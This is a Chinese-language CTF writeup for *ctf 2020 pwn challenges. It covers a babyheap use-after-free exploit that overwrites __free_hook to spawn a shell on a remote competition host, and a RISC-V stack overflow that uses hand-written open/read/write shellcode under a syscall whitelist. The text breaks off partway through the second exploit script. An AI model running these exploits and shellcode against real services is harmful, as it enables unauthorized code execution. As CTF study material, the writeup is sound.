# 2020 *ctf 部分pwn writeup
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
感谢[xmzyshypnc](https://ama2in9.top) 师傅和xxrw师傅手把手教学。
## babyheap
漏洞是一个`UAF`漏洞，程序实现了`6`个程序，`add,delete,edit,show,leave_name,show_name`，其中`add`函数限制了申请堆块的大小，`delete`函数中存在`UAF`漏洞，`leave_name`函数中申请了一个`0x400`大小的堆块。
因此这里首先申请`4`个`0x20,fastbin`，接着`leave_name`函数申请一个较大的堆块，使得`fastbin`堆块合并成`0x80`大小的`small
bin`，这样就能泄漏出`libc`基址，由于`edit`的起始位置是`+8`开始的，因此再次申请的堆块大小需要覆盖三个`fastbin`，因此申请一个`0x60`大小的堆块。这样就可以满足覆写`fd`指针为`free_hook-8`和`/bin/sh`字符串两个要求。
    # encoding=utf-8
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xdd9)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('52.152.231.198', 8081)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    def add(index, size):
        p.sendlineafter(">> \n", "1")
        p.sendlineafter("input index\n", str(index))
        p.sendlineafter("input size\n", str(size))
    def delete(index):
        p.sendlineafter(">> \n", "2")
        p.sendlineafter("input index\n", str(index))
    def edit(index, content):
        p.sendlineafter(">> \n", "3")
        p.sendlineafter("input index\n", str(index))
        p.sendafter("input content\n", content)
    def show(index):
        p.sendlineafter(">> \n", "4")
        p.sendlineafter("input index\n", str(index))
    def leave_name(name):
        p.sendlineafter(">> \n", "5")
        p.sendafter("your name:\n", name)
    def show_name():
        p.sendlineafter(">> \n", "6")
    for i in range(11):
        add(i, 0x18)
    for i in range(7):
        delete(i + 4)
    delete(0)
    delete(1)
    delete(2)
    delete(3)
    leave_name("1212")
    show(0)
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 0xd0 - 0x10 - libc.sym['__malloc_hook']
    for i in range(7):
        add(i + 4, 0x18)
    # gdb.attach(p, "b *$rebase(0xdd9)")
    log.success("libc address is {}".format(hex(libc.address)))
    add(11, 0x60)
    delete(1)
    payload = b"a"*0x10 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x8)
    payload += b"b"*0x10 + p64(0x21) + b"/bin/sh\x00"
    edit(11, payload)
    add(12, 0x50)
    add(13, 0x50)
    edit(13, p64(libc.sym['system']))
    delete(2)
    p.interactive()
## Favourite Architecure flag1
`riscv`栈溢出的漏洞，但是`ghidra`反编译失败，不知道咋回事。漏洞存在于输入`flag`的地方。
    00010436 b7 e7 04 00     lui        a5=>DAT_0004e000,0x4e               = FFh
    0001043a 13 85 07 89     addi       a0=>s_Input_the_flag:_0004d890,a5,-0x770 = "Input the flag: "
    0001043e ef 50 d0 41     jal        ra,FUN_0001605a    //output()
    00010442 93 07 84 ed     addi       a5,s0,-0x128   //DAT_0004e000,0x4e                            = FFh
    0001057e 13 85 87 8f     addi       a0=>s_You_are_wrong_._._0004d8f8,a5,-0x70= "You are wrong ._."
    00010582 ef 60 60 64     jal        ra,FUN_00016bc8              //output()
    00010586 85 47           c.li       a5,0x1
    LAB_00010588                                    XREF[1]:     0001056e(j)  
    00010588 3e 85           c.mv       a0,a5
    0001058a fe 70           c.ldsp     ra,0x1f8(sp)
    0001058c 5e 74           c.ldsp     s0,0x1f0(sp)
    0001058e 13 01 01 20     addi       sp,sp,0x200
    00010592 82 80           ret
从第一层的逻辑看来，首先是`read`了一个很长的字符串（注意到这里的函数不一定是`read`，功能类似）。但是分配的长度才是`0x128`字节大小，因此这里可以溢出。并且如果我们输入的长度不为`0x59`那么直接会跳转到错误输出的位置之后结束进程，在结束进程的时候读取了`sp+0x1f8`的位置的值作为返回地址，因此我们可以直接溢出到返回地址。那么接下来就是如何利用的问题。
注意到题目给出的`patch`文件
    diff --git a/linux-user/syscall.c b/linux-user/syscall.c
    index 27adee9..2d75464 100644
    --- a/linux-user/syscall.c
    +++ b/linux-user/syscall.c
    @@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,
             print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);
         }
    -    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
    -                      arg5, arg6, arg7, arg8);
    +    switch (num) {
    +        // syscall whitelist
    +        case TARGET_NR_brk:
    +        case TARGET_NR_uname:
    +        case TARGET_NR_readlinkat:
    +        case TARGET_NR_faccessat:
    +        case TARGET_NR_openat2:
    +        case TARGET_NR_openat:
    +        case TARGET_NR_read:
    +        case TARGET_NR_readv:
    +        case TARGET_NR_write:
    +        case TARGET_NR_writev:
    +        case TARGET_NR_mmap:
    +        case TARGET_NR_munmap:
    +        case TARGET_NR_exit:
    +        case TARGET_NR_exit_group:
    +        case TARGET_NR_mprotect:
    +            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
    +                    arg5, arg6, arg7, arg8);
    +            break;
    +        default:
    +            printf("[!] %d bad system call\n", num);
    +            ret = -1;
    +            break;
    +    }
         if (unlikely(qemu_loglevel_mask(LOG_STRACE))) {
             print_syscall_ret(cpu_env, num, ret, arg1, arg2,
我们看到其只允许调用特定的系统调用，也就是我们只能编写`orw
shellcode`，而程序没有开启`pie`，也就是栈地址固定不变（需要注意的是本地栈地址和远程不一样，因此需要添加滑板指令）。
`shellcode`的编写参考网上的`shellcode`
    .section .text
    .globl _start
    .option rvc
    _start:
        #open
        li a1,0x67616c66 #flag
        sd a1,4(sp)
        addi a1,sp,4
        li a0,-100
        li a2,0
        li a7, 56 # __NR_openat
        ecall
        # read
        c.mv a2,a7
        addi a7,a7,7
        ecall
        # write
        li a0, 1
        addi a7,a7,1
        ecall
    10078:    676175b7              lui    a1,0x67617
    1007c:    c665859b              addiw    a1,a1,-922
    10080:    00b13223              sd    a1,4(sp)
    10084:    004c                  addi    a1,sp,4
    10086:    f9c00513              li    a0,-100
    1008a:    4601                  li    a2,0
    1008c:    03800893              li    a7,56
    10090:    00000073              ecall
    10094:    8646                  mv    a2,a7
    10096:    089d                  addi    a7,a7,7
    10098:    00000073              ecall
    1009c:    4505                  li    a0,1
    1009e:    0885                  addi    a7,a7,1
    100a0:    00000073              ecall
最终的`exp`
    # encoding=utf-8
    from pwn import *
    file_path = "./main"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process(["./qemu-riscv64", "-g", "1234", file_path])
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('119.28.89.167', 60001)
    stack = 0x4000800c70
    nop = p32(0x00000013)
    p.recvuntil("Input the flag: ")
    payload = b"a"*0x118
    payload += p64(stack)*2
    shellcode = nop * 0xd0
    shellcode += p32(0x676175b7) + p32(0xc665859b) + p32(0x00b13223)
    shellcode += p16(0x004c) + p32(0xf9c00513) + p16(0x4601)